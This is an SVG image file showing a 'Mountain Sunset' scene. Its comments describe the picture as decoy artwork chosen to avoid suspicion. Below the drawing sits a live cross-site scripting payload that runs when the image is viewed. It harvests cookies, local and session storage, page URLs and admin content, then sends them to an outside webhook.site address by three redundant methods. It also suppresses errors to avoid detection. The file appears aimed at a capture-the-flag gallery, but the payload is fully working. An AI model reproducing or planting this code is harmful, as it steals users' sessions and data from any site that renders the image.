<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="400" height="300" viewBox="0 0 400 300">
  <!-- Legitimate-looking artwork to avoid suspicion -->
  <defs>
    <linearGradient id="sunset" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" style="stop-color:#ff7f50;stop-opacity:1" />
      <stop offset="50%" style="stop-color:#ff6347;stop-opacity:1" />
      <stop offset="100%" style="stop-color:#ff4500;stop-opacity:1" />
    </linearGradient>
  </defs>
  
  <!-- Background -->
  <rect width="400" height="300" fill="url(#sunset)"/>
  
  <!-- Mountains -->
  <polygon points="0,200 100,120 200,160 300,100 400,140 400,300 0,300" fill="#4a4a4a" opacity="0.8"/>
  
  <!-- Sun -->
  <circle cx="320" cy="80" r="30" fill="#ffff00" opacity="0.9"/>
  
  <!-- Title text -->
  <text x="200" y="280" text-anchor="middle" font-family="Arial" font-size="18" fill="white">Mountain Sunset</text>
  
  <!-- XSS Payload Hidden in Script -->
  <script type="text/javascript">
    <![CDATA[
    // Gallery XSS Payload
    (function() {
        try {
            // Collect sensitive data
            var data = {
                cookies: document.cookie,
                url: window.location.href,
                domain: document.domain,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                referrer: document.referrer,
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage)
            };
            
            // Check for admin indicators
            if (document.cookie.includes('admin') || 
                document.cookie.includes('flag') ||
                window.location.href.includes('admin')) {
                data.admin_access = true;
            }
            
            // Extract any visible admin content
            var adminContent = document.querySelector('.admin-content');
            if (adminContent) {
                data.admin_content = adminContent.innerText.substring(0, 500);
            }
            
            // Send to webhook via multiple methods for reliability
            
            // Method 1: Image request
            var img = new Image();
            img.src = 'https://webhook.site/19178815-ab5f-44c5-b8bc-078fecab6190?method=img&data=' + 
                     encodeURIComponent(JSON.stringify(data));
            
            // Method 2: Fetch API
            fetch('https://webhook.site/19178815-ab5f-44c5-b8bc-078fecab6190', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    source: 'gallery_svg_xss',
                    payload_type: 'mountain_sunset',
                    data: data
                })
            }).catch(function(e) {
                console.log('Fetch failed silently');
            });
            
            // Method 3: XMLHttpRequest fallback
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://webhook.site/19178815-ab5f-44c5-b8bc-078fecab6190');
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({
                source: 'gallery_svg_xss_xhr',
                data: data
            }));
            
        } catch(e) {
            // Silent failure to avoid detection
            console.log('Script executed with minor errors');
        }
    })();
    ]]>
  </script>
</svg>
